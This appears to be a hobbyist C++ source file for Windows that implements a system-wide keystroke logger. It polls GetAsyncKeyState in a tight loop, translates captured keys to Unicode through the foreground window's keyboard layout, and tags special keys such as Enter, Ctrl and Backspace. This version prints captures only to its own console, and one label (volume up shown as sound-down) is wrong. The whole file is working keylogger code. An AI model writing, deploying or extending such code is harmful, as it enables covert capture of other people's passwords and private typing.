
//"" chcp 65001
// inspired by  https://github.com/SherifEldeeb/UniLogger/blob/master/Source.cpp
// big thanks to https://github.com/SherifEldeeb !

#include <windows.h>
#include <string>
#include <iostream>
#include <vector>

#include <fcntl.h>
#include <io.h>

using namespace std;


wstring int_to_unicode(INT keystroke)
{
    DWORD dwProcessId;
    HWND WindowHandle = GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
    DWORD dwThreadId = GetWindowThreadProcessId(WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
    BYTE kState[256]={0};

    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.
    HKL hkl = GetKeyboardLayout(dwThreadId); //Récupère l'identificateur de paramètres régionaux d'entrée actif (anciennement appelé disposition du clavier).
    UINT virtual_key = keystroke;
    WCHAR uni_key[32]={0};

    ToUnicodeEx(virtual_key, keystroke, kState, uni_key, 32, 0, hkl);

    wcout << uni_key;
    return (wstring) uni_key;
}

wstring SpecialKey(INT &keystroke) 
{
  //  wcout << "keystroke: " << keystroke << endl;
    switch(keystroke)
    {
    //http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
    case VK_SPACE:
        return L" ";
        
    case VK_SHIFT:
        return L"[SHIFT]";
                                                    
    case VK_RETURN:
        return L"[ENTER]";
        
    case VK_BACK:
        return L"[BACKSPACE]";
        
    case VK_TAB:
        return L"[TAB]";
        
    case VK_CONTROL:
        return L"[CTRL]";
            
    case VK_DELETE:
        return L"[DEL]";
        
    case VK_OEM_1:
        return L"[;:]";
        
    case VK_OEM_2:
        return L"[/?]";
        
    case VK_OEM_3:
        return L"[`~]";
        
    case VK_OEM_4:
        return L"[ [{ ]";
            
    case VK_OEM_5:
        return L"[\\|]";
                                        
    case VK_OEM_6:
        return L"[ ]} ]";
        
    case VK_OEM_7:
        return L"['\"]";
        
    case VK_OEM_PLUS:
        return L"[=+]";
        
    case VK_OEM_COMMA:
        return L"[[,<]";
        
    case VK_OEM_MINUS:
        return L"[-_]";
        
    case VK_OEM_PERIOD:
        return(L"[.>]");
        
    case VK_NUMPAD0:
        return L"0";
        
    case VK_NUMPAD1:
        return L"1";
        
    case VK_NUMPAD2:
        return L"2";
        
    case VK_NUMPAD3:
        return L"3";
        
    case VK_NUMPAD4:
        return L"4";
        
    case VK_NUMPAD5:
        return L"5";
        
    case VK_NUMPAD6:
        return L"6";
        
    case VK_NUMPAD7:
        return L"7";
        
    case VK_NUMPAD8:
        return L"8";
        
    case VK_NUMPAD9:
        return L"9";
        
    case VK_CAPITAL:
        return L"[CAPS LOCK]";
        
    case VK_PRIOR:
        return L"[PAGE UP]";
        
    case VK_NEXT:
        return L"[PAGE DOWN]";
        
    case VK_END:
        return L"[END]";
        
    case VK_HOME:
        return L"[HOME]";
        
    case VK_LWIN:
        return L"[WIN]";
        
    case VK_RWIN:
        return L"[WIN]";
        
    case VK_VOLUME_MUTE:
        return L"[SOUND-MUTE]";
        
    case VK_VOLUME_DOWN:
        return L"[SOUND-DOWN]";
        
    case VK_VOLUME_UP:
        return L"[SOUND-DOWN]";
        
    case VK_MEDIA_PLAY_PAUSE:
        return L"[MEDIA-PLAY/PAUSE]";
        
    case VK_MEDIA_STOP:
        return L"[MEDIA-STOP]";
        
    case VK_MENU:
        return L"[ALT]";
    
    default:
        return L""; //If the key and unknown or uninteresting 
    }
}

int main ()
{
    SetConsoleOutputCP(CP_UTF8); 
    //SetConsoleCP(CP_UTF8);
    _setmode(_fileno(stdout), 0x00020000);  
    _setmode(_fileno(stdin), 0x00020000);

    wcout << "test " << endl;
    WCHAR test[] = L"Ελληνικά";
    wcout << test << endl;
    while (true)
    {
        Sleep(10);
        for(int keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
        {
            //cout  << keystroke << endl;
            if(GetAsyncKeyState(keystroke) == -32767)
            {
                //cout << keystroke << endl;
                if((keystroke>=39)&&(keystroke<91))
                {
                    //not SpecialKey
                    int_to_unicode(keystroke);
                }
                else
                {
                    wcout << SpecialKey(keystroke);
                }
            }
        }
    }

    return 0;
}